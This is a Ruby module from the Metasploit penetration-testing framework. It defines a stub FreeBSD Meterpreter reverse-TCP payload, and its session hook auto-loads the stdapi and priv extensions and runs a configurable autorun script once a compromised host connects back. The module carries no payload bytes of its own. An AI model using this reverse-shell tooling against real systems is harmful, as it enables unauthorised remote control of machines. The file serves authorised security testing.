##
# $Id: metsvc_reverse_tcp.rb 6848 2009-07-19 20:51:58Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/meterpreter_x86_bsd'

module Metasploit3

	include Msf::Payload::Bsd
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'FreeBSD Meterpreter Service, Reverse TCP Inline',
			'Version'       => '$Revision: 6848 $',
			'Description'   => 'Stub payload for interacting with a Meterpreter Service',
			'Author'        => 'hdm',
			'License'       => BSD_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::Meterpreter_x86_BSD,
			'Payload'       =>
				{
					'Offsets' => {},
					'Payload' => ""
				}
			))
		# Set advanced options
		register_advanced_options(
			[
				OptBool.new('AutoLoadStdapi',
					[
						true,
						"Automatically load the Stdapi extension",
						true
					]),
				OptString.new('AutoRunScript', [false, "Script to autorun on meterpreter session creation", ''])
			], self.class)			
	end

	#
	# Once a session is created, automatically load the stdapi extension if the
	# advanced option is set to true.
	#
	def on_session(session)
		super
		if (datastore['AutoLoadStdapi'] == true)
			session.load_stdapi 
			if (framework.exploits.create(session.via_exploit).privileged?)
				session.load_priv 
			end
		end
		if (datastore['AutoRunScript'].empty? == false)
			client = session
			args = datastore['AutoRunScript'].split
			session.execute_script(args.shift, binding)
		end
	end
	
end
